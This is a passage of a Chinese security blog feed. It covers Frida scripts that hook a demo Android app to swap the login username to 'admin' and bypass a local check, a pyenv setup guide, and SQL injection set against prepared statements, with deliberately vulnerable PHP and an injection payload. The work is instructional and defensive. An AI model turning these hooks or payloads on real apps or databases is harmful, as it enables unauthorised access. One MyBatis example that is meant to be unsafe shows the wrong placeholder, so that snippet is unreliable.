class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callSecretFun</span>(<span class="params"></span>) &#123; <span class="comment">//定义导出函数</span></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">//找到隐藏函数并且调用</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.fridatest.demo02.MainActivity&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance: &quot;</span> + instance);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Result of secret func: &quot;</span> + instance.<span class="title function_">secret</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">callsecretfunction</span>: callSecretFun <span class="comment">//把callSecretFun函数导出为callsecretfunction符号，导出名不可以有大写字母或者下划线</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610496.png" alt="image-20210928203331233" style="zoom:67%;" /><h1 id="动态修改充当代理"><a href="#动态修改充当代理" class="headerlink" title="动态修改充当代理"></a>动态修改充当代理</h1><p>把数据从app传到py，修改过后再传回到app，不仅仅用py远程调用app函数。</p><p>如果登录用户为admin则直接返回错误禁止登录。如果不是则把用户和密码上传到服务器上进行验证。关键点在message_tv.setText函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fridatest.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">username_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText);</span><br><span class="line">        password_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText2);</span><br><span class="line">        message_tv = ((TextView) findViewById(R.id.textView));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (username_et.getText().toString().compareTo(<span class="string">&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    message_tv.setText(<span class="string">&quot;You cannot login as admin&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message_tv.setText(<span class="string">&quot;Sending to the server :&quot;</span> + Base64.encodeToString((username_et.getText().toString() + <span class="string">&quot;:&quot;</span> + password_et.getText().toString()).getBytes(), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据id添加控件，记得设置约束，不然打开app后控件会挤到一起。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610996.png" alt="image-20210928231548540"></p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610434.jpg" alt="41632842214_.pic_hd" style="zoom:33%;" /><p>接下来要做的，在前端输入除admin外的账号，传到py里自动修改成admin，绕过本地校验登录，类似抓包改参。</p><p>js的作用是截取输入，传给py，暂停app执行，等待py修改完成后传回，再继续执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tv_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>);</span><br><span class="line">    tv_class.<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send = x.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        <span class="title function_">send</span>(string_to_send); <span class="comment">// 将数据发送给py</span></span><br><span class="line">        <span class="title function_">recv</span>(<span class="keyword">function</span> (<span class="params">received_json_object</span>) &#123;</span><br><span class="line">            string_to_recv = received_json_object.<span class="property">my_data</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv: &quot;</span> + string_to_recv);</span><br><span class="line">        &#125;).<span class="title function_">wait</span>(); <span class="comment">//收到数据之后，再执行下去</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setText</span>(string_to_recv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>py将接受到的数据解析，提取出密码，然后将用户名替换成admin，再经过js发送给app，实现代理效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="comment">#print(message)</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> message[<span class="string">&#x27;payload&#x27;</span>] != <span class="string">&#x27;You cannot login as admin&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;message:&#x27;</span>, message)</span><br><span class="line">            data = message[<span class="string">&quot;payload&quot;</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            data = base64.b64decode(data)  <span class="comment"># 解码后是byte型</span></span><br><span class="line">            data = <span class="built_in">str</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;orgin:&#x27;</span>, data)</span><br><span class="line">            user, pw = data.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            data = <span class="string">f&#x27;admin:<span class="subst">&#123;pw&#125;</span>&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;modified:&#x27;</span>, data)</span><br><span class="line">            data = base64.b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            data = <span class="built_in">str</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;encoded data:&#x27;</span>, data)</span><br><span class="line">            script.post(&#123;<span class="string">&#x27;my_data&#x27;</span>: data&#125;)  <span class="comment"># 将JSON对象发送回去</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;modified data sent&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;You cannot login as admin&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&#x27;com.fridatest.demo03&#x27;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test04.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, my_message_handler)  <span class="comment"># 注册消息处理函数</span></span><br><span class="line">script.load()</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>运行py，启动app，输入账号密码提交。js已接收到py替换后的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202110011610280.png" alt="image-20210929112030278"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/hookmaster/frida-all-in-one/blob/master/03.%E5%9F%BA%E6%9C%AC%E6%A1%88%E4%BE%8B%E4%B8%8A%E6%89%8B/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E9%A2%86%E6%82%9FFrida%E7%9A%84%E7%B2%BE%E9%AB%93(%E5%9F%BA%E4%BA%8E%E5%AE%89%E5%8D%938.1)/READMD.md">https://github.com/hookmaster/frida-all-in-one/blob/master/03.%E5%9F%BA%E6%9C%AC%E6%A1%88%E4%BE%8B%E4%B8%8A%E6%89%8B/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E9%A2%86%E6%82%9FFrida%E7%9A%84%E7%B2%BE%E9%AB%93(%E5%9F%BA%E4%BA%8E%E5%AE%89%E5%8D%938.1)/READMD.md</a></p>]]></content>
      
      
      <categories>
          
          <category> APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> APP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac下Pyenv环境配置</title>
      <link href="/2021/09/02/c12c7d68.html"/>
      <url>/2021/09/02/c12c7d68.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pyenv</span><br></pre></td></tr></table></figure><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>一定要注意，用命令查看当前版本pyenv的环境变量到底怎么配，google出来的都不对，浪费好多时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv init</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202109022149829.png" alt="image-20210902212508796" style="zoom:67%;" /><p>我只有.&#x2F;zprofile，在里面加上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PYENV_ROOT=&quot;$HOME/.pyenv&quot;</span><br><span class="line">export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;</span><br><span class="line">eval &quot;$(pyenv init --path)&quot;</span><br></pre></td></tr></table></figure><p>在.&#x2F;zshrc里加，据说需要加到底部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &quot;$(pyenv init -)&quot;</span><br></pre></td></tr></table></figure><h1 id="选择py版本"><a href="#选择py版本" class="headerlink" title="选择py版本"></a>选择py版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查看能安装啥py版本</span><br><span class="line">pyenv install --list</span><br><span class="line"></span><br><span class="line"># 查看当前py版本</span><br><span class="line">pyenv version</span><br><span class="line"></span><br><span class="line"># 查看已安装版本</span><br><span class="line">pyenv versions</span><br><span class="line"></span><br><span class="line"># 安装卸载</span><br><span class="line">pyenv install py</span><br><span class="line">uninstall </span><br></pre></td></tr></table></figure><p>环境变量配置错的话，就会配置失效，实际上用的还是系统版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br></pre></td></tr></table></figure><h1 id="切换py"><a href="#切换py" class="headerlink" title="切换py"></a>切换py</h1><p>一般别用global，优先级shell &gt; local &gt; global。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyenv global py</span><br><span class="line">pyenv local py</span><br><span class="line">pyenv shell py</span><br></pre></td></tr></table></figure><p>取消设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv global/local/shell --unset</span><br></pre></td></tr></table></figure><h1 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h1><p>慢的话可以提前下好压缩包cp到缓存文档，之后安装自动调用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.pyenv/cache</span><br><span class="line"><span class="built_in">cp</span> tar.bz2 ~/.pyenv/cache</span><br></pre></td></tr></table></figure><p>用完手动删。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注入与预编译</title>
      <link href="/2021/08/18/e5af4d61.html"/>
      <url>/2021/08/18/e5af4d61.html</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>注入是因为动态字符串的拼接导致原本的sql语句发生变化，在编译的过程中执行了恶意操作。</p><p>预编译是提前将sql语句送到数据库去分析、编译，此时sql语句被缓存下来，格式已经定了，即使后续插入恶意参数也不会参与sql编译，直接被当做纯字符串去查询。</p><h1 id="预编译的优点"><a href="#预编译的优点" class="headerlink" title="预编译的优点"></a>预编译的优点</h1><p>进行查询时将整个命令向mysql服务器发送一次，以后只有参数发生变化，mysql服务器只需对命令的结构做一次分析就够了，减少了需要传输的数据量，提高了命令的处理效率。</p><h1 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h1><h2 id="php-mysql"><a href="#php-mysql" class="headerlink" title="php+mysql"></a>php+mysql</h2><p>未设置过滤的页面，存在注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM user WHERE name = &#x27;%s&#x27; and pass= &#x27;%s&#x27;&quot;</span>, <span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$query</span>.<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;&amp;nbsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210714130544.png"></p><p>采用预处理进行防御。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$link</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;123456&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">#prepare()方法负责准备要执行的查询，使用占位符</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM user WHERE name = ? and pass= ?&quot;</span>);</span><br><span class="line"><span class="comment">#bindParam()方法指定的绑定参数提供给execute()方法，强行绑定参数的数据类型，并且进行一定的转义</span></span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$id</span>, <span class="variable">$name</span>, <span class="variable">$pass</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">fetch</span>())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s %s %s&quot;</span>, <span class="variable">$id</span>, <span class="variable">$name</span>, <span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210714130800.png"></p><p>换成PDO试一下，通过命名参数的方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbms</span> = <span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$pwd</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;<span class="subst">$dbms</span>:host=<span class="subst">$host</span>;port=3306;dbname=<span class="subst">$dbname</span>&quot;</span>;</span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$user</span>, <span class="variable">$pwd</span> );</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM user WHERE name = :name and pass= :pass&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&quot;:name&quot;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&quot;:pass&quot;</span>, <span class="variable">$b</span>); </span><br><span class="line"><span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$result</span>=<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="title class_">PDO</span>::FETCH_ASSOC))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot; &quot;</span>.<span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; &quot;</span>.<span class="variable">$result</span>[<span class="string">&#x27;pass&#x27;</span>].<span class="string">&quot; &quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210714130554.png"></p><h2 id="mybatis-mysql"><a href="#mybatis-mysql" class="headerlink" title="mybatis+mysql"></a>mybatis+mysql</h2><p>建好maven工程，添加依赖，然后编写实体类、DAO、mapper、数据库配置、测试类。过程略过。</p><p>在mybatis里动态传递参数有两种方式：</p><ol><li>${}拼接符：取值以后再编译sql语句。</li><li>#{}占位符：编译好sql语句再取值。</li></ol><p>使用${}做拼接传参。</p><p>DAO：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SecurityMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Security <span class="title function_">listAll</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mapper：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.inject.dao.SecurityMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">        select * from users</span><br><span class="line">        WHERE username = #&#123;username&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Security</span> <span class="variable">security</span> <span class="operator">=</span> mapper.listAll(<span class="string">&quot;Dumb&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>插入payload，可见${}是无法防止注入的，仅仅用来取值，变量替换后也不会自动添加单引号，会直接参与sql编译。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/20210714133131.png" alt="image-20210714133112320"></p><p>使用#{}做拼接传参。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.inject.dao.SecurityMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.inject.pojo.Security&quot;</span>&gt;</span></span><br><span class="line">        select * from users</span><br><span class="line">        WHERE username = #&#123;username&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Mybatis在处理#{}时，会将#{}中内容替换为?，然后再调用PreparedStatement的set方法来赋值，生成字符串（PreparedStatement是Statement的子类，它的对象包含了编译好的sql语句，以后要使用sql语句只需要调用就可以了）。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg/img/202108190920193.png" alt="image-20210819092007775"></p><p><strong>总结：</strong></p><p>尽量使用#{}。</p><h1 id="存储过程"><a href="#存储过程" class="headerlink" 